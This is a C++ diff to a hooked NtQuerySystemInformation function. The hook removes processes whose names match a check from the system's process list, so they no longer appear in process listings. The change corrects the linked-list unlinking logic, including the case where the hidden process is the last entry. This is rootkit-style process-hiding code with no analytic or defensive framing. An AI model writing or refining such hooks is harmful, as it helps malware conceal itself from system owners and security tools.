@@ -23,19 +23,22 @@ NTSTATUS _stdcall HookNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemIn
     const NTSTATUS Result = FuncNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 
     if (NT_SUCCESS(Result) && SystemInformationClass == SystemProcessInformation) {
-        PSYSTEM_PROCESS_INFO pSystemProcess = static_cast<PSYSTEM_PROCESS_INFO>(SystemInformation);
-        PSYSTEM_PROCESS_INFO pNextSystemProcess = reinterpret_cast<PSYSTEM_PROCESS_INFO>(reinterpret_cast<PBYTE>(pSystemProcess) + pSystemProcess->NextEntryOffset);
-        ULONG NextEntryOffset;
+        PSYSTEM_PROCESS_INFO pCurrent = NULL;
+        PSYSTEM_PROCESS_INFO pNext = static_cast<PSYSTEM_PROCESS_INFO>(SystemInformation);
 
         do {
-            NextEntryOffset = pNextSystemProcess->NextEntryOffset;
+            pCurrent = pNext;
+            pNext = reinterpret_cast<PSYSTEM_PROCESS_INFO>(reinterpret_cast<PUCHAR>(pCurrent) + pCurrent->NextEntryOffset);
 
-            if (checkProcessName(pNextSystemProcess->ImageName.Buffer)) {
-                pSystemProcess->NextEntryOffset += pNextSystemProcess->NextEntryOffset;
+            if (checkProcessName(pNext->ImageName.Buffer)) {
+                if (pNext->NextEntryOffset == 0) {
+                    pCurrent->NextEntryOffset = 0;
+                } else {
+                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
+                }
+                pNext = pCurrent;
             }
-            pSystemProcess = pNextSystemProcess;
-            pNextSystemProcess = reinterpret_cast<PSYSTEM_PROCESS_INFO>(reinterpret_cast<PBYTE>(pSystemProcess) + pSystemProcess->NextEntryOffset);
-        } while (NextEntryOffset);
+        } while (pNext->NextEntryOffset != 0);
     }
 
     return Result;
